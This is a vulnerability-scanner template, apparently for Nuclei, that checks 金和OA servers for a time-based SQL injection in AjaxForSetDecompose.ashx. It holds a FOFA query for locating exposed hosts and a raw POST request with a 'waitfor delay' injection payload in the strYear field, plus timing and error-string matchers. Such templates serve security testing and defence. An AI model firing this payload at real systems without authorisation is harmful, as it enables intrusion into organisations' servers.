id: poc-yaml-jinher-jhsoft-ajaxforsetdecompose-ashx-sqli
info:
  name: 金和OA AjaxForSetDecompose.ashx SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    product: 金和OA
    fofa-query: app="金和网络-金和OA"

variables:
  t1: "{{rand_int(5, 10)}}"
  t2: "{{to_number(t1) + to_number(t1)}}"
  t3: "{{to_number(t2) + 2}}"

http:
  - raw:
      - |
        POST /c6/JHSoft.Web.CostControl/Decompose/AjaxForSetDecompose.ashx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        strType=getDetpCollect&strYear=1;waitfor+delay%270:0:{{t1}}%27--
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "未能找到路径"
        part: body
      - type: word
        words:
          - "JHSoft"
        part: body
      - type: word
        words:
          - "System.IO"
        part: body
      - type: dsl
        dsl:
          - "duration >= t2 && duration <= t3"
